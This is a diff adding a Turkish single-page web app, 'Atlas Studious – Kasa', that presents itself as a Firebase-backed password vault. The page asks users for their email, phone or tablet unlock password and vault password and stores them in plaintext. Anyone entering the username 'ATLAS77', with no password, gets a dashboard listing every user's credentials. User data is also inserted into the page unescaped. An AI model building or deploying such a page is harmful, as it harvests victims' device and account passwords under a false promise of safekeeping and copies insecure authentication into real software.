@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Atlas Studious – Kasa</title>
+<style>
+body{margin:0;font-family:system-ui;background:#0f1220;color:#fff}
+.screen{display:none;padding:16px}
+#splash{display:flex;align-items:center;justify-content:center;height:100vh;font-size:36px;font-weight:900;letter-spacing:2px}
+.fade{animation:fadeout 5s forwards}
+@keyframes fadeout{0%{opacity:1}80%{opacity:1}100%{opacity:0;display:none}}
+.card{background:#1c1f3a;border-radius:12px;padding:12px;margin:8px 0}
+input,button,textarea{width:100%;padding:12px;border-radius:10px;border:none;margin:6px 0}
+button{background:#00ffd5;color:#000;font-weight:800}
+.danger{background:#ff4d4d;color:#fff}
+.list{max-height:220px;overflow:auto}
+.msg{background:#0b0e22;border-radius:10px;padding:8px;margin:6px 0}
+.badge{font-size:12px;opacity:.7}
+</style>
+</head>
+<body>
+
+<div id="splash" class="screen" style="display:flex;">ATLAS STUDIOUS</div>
+
+<div id="login" class="screen">
+  <h2>Giriş</h2>
+  <input id="username" placeholder="Kullanıcı adı"/>
+  <button onclick="loginUser()">Giriş</button>
+</div>
+
+<div id="userForm" class="screen">
+  <h2>Bilgilerini Gir</h2>
+  <input id="email" placeholder="E-posta"/>
+  <input id="devicePass" placeholder="Tablet/Telefon Şifresi"/>
+  <input id="info1" placeholder="Bilgi 1"/>
+  <input id="info2" placeholder="Bilgi 2"/>
+  <input id="info3" placeholder="Bilgi 3"/>
+  <input id="info4" placeholder="Bilgi 4"/>
+  <input id="vaultPass" placeholder="Kasa Şifresi"/>
+  <button onclick="saveUser()">Kasaya Kilitle</button>
+  <button class="danger" onclick="logout()">Başka kullanıcıyla gir</button>
+</div>
+
+<div id="dashboard" class="screen">
+  <h2 id="who"></h2>
+
+  <div class="card">
+    <h3>Mesajlar (ATLAS77)</h3>
+    <div id="messages" class="list"></div>
+  </div>
+
+  <div class="card">
+    <h3>Kullanıcılar</h3>
+    <div id="users" class="list"></div>
+  </div>
+
+  <div class="card">
+    <h3>Mesaj Gönder (ATLAS77 → Seçili Kullanıcı)</h3>
+    <select id="toUser"></select>
+    <textarea id="adminMsg" placeholder="Mesaj yaz"></textarea>
+    <button onclick="sendAdminMsg()">Gönder</button>
+  </div>
+
+  <button class="danger" onclick="logout()">Çıkış / Başka kullanıcı</button>
+</div>
+
+<div id="userPanel" class="screen">
+  <h2 id="me"></h2>
+  <button onclick="forgot()">Şifremi Unuttum (ATLAS77’ye mesaj)</button>
+  <button class="danger" onclick="logout()">Çıkış / Başka kullanıcı</button>
+</div>
+
+<!-- Firebase -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, doc, setDoc, getDoc, getDocs, collection, addDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCXZnWsRi68dz5uBx0Hmyla8wNssFddvG4",
+  authDomain: "attt-3d31e.firebaseapp.com",
+  projectId: "attt-3d31e",
+  storageBucket: "attt-3d31e.firebasestorage.app",
+  messagingSenderId: "31268659423",
+  appId: "1:31268659423:web:1afa6bc24900d3966b896a",
+  measurementId: "G-T15780Q6NE"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+const splash = document.getElementById('splash');
+const login = document.getElementById('login');
+const userForm = document.getElementById('userForm');
+const dashboard = document.getElementById('dashboard');
+const userPanel = document.getElementById('userPanel');
+const who = document.getElementById('who');
+const usersDiv = document.getElementById('users');
+const messagesDiv = document.getElementById('messages');
+const toUser = document.getElementById('toUser');
+const me = document.getElementById('me');
+
+let currentUser = null;
+
+setTimeout(()=>{ splash.classList.add('fade'); setTimeout(()=>{ splash.style.display='none'; login.style.display='block'; },5000)},100);
+
+window.loginUser = async ()=>{
+  const u = document.getElementById('username').value.trim();
+  if(!u) return alert('Kullanıcı adı gir');
+  currentUser = u;
+  if(u === 'ATLAS77'){
+    who.innerText = "Uygulama Kurucusu – ATLAS77";
+    dashboard.style.display='block';
+    login.style.display='none';
+    listenUsers();
+    listenMessages();
+  }else{
+    me.innerText = u;
+    login.style.display='none';
+    const ref = doc(db,'users',u);
+    const snap = await getDoc(ref);
+    if(snap.exists()){
+      userPanel.style.display='block';
+    }else{
+      userForm.style.display='block';
+    }
+  }
+}
+
+window.saveUser = async ()=>{
+  const data = {
+    email: email.value,
+    devicePass: devicePass.value,
+    info1: info1.value, info2: info2.value, info3: info3.value, info4: info4.value,
+    vaultPass: vaultPass.value,
+    createdAt: serverTimestamp()
+  };
+  await setDoc(doc(db,'users',currentUser), data);
+  userForm.style.display='none';
+  userPanel.style.display='block';
+}
+
+window.logout = ()=>{
+  currentUser=null;
+  userForm.style.display='none';
+  dashboard.style.display='none';
+  userPanel.style.display='none';
+  login.style.display='block';
+}
+
+function listenUsers(){
+  onSnapshot(collection(db,'users'), (snap)=>{
+    usersDiv.innerHTML='';
+    toUser.innerHTML='';
+    snap.forEach(d=>{
+      const v = d.data();
+      usersDiv.innerHTML += `<div class="msg"><b>${d.id}</b><div class="badge">E-posta: ${v.email} | Cihaz Şifresi: ${v.devicePass} | Kasa Şifresi: ${v.vaultPass}</div></div>`;
+      toUser.innerHTML += `<option value="${d.id}">${d.id}</option>`;
+    });
+  });
+}
+
+function listenMessages(){
+  onSnapshot(collection(db,'messages'), (snap)=>{
+    messagesDiv.innerHTML='';
+    snap.forEach(d=>{
+      const m = d.data();
+      messagesDiv.innerHTML += `<div class="msg"><b>${m.from}</b>: ${m.text}</div>`;
+    });
+  });
+}
+
+window.forgot = async ()=>{
+  await addDoc(collection(db,'messages'), { from: currentUser, text: "Şifremi unuttum", at: serverTimestamp() });
+  alert("ATLAS77'ye mesaj gönderildi.");
+}
+
+window.sendAdminMsg = async ()=>{
+  const to = toUser.value;
+  const text = adminMsg.value;
+  if(!to || !text) return;
+  await addDoc(collection(db,'messages'), { from: "ATLAS77 → "+to, text, at: serverTimestamp() });
+  adminMsg.value='';
+}
+</script>
+</body>
+</html>
